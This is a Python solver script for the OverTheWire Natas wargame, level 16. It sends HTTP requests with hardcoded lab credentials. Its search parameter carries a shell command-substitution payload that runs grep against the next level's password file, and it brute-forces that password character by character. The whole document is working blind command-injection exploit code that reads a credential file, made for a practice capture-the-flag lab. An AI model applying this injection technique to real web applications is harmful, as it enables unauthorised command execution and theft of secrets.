import requests
from requests.auth import HTTPBasicAuth

def query(param):
    print("querying {}".format(param))
    url = "http://natas16.natas.labs.overthewire.org/index.php"
    auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

    # word that is not a prefix of anything else
    word = 'fabricates'

    params = {'needle': '{}{}'.format(word, param)}

    res = requests.get(url, params=params, auth=auth)

    return not(word in res.text)

import string
#chars = ''
#for c in sorted(string.printable[:62]):
#    if (query('$(grep {} /etc/natas_webpass/natas17)'.format(c))):
#        chars += c
#        print(chars)

chars = '035789AGHNPQSWbcdghkmnqrsw'
#passwd = ''
passwd = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
while len(passwd) < 32:
    for c in chars:
        test = passwd + c
        if (query('$(grep ^{} /etc/natas_webpass/natas17)'.format(test))):
            passwd = test
            break
    print(passwd)

print('end')
print(passwd)

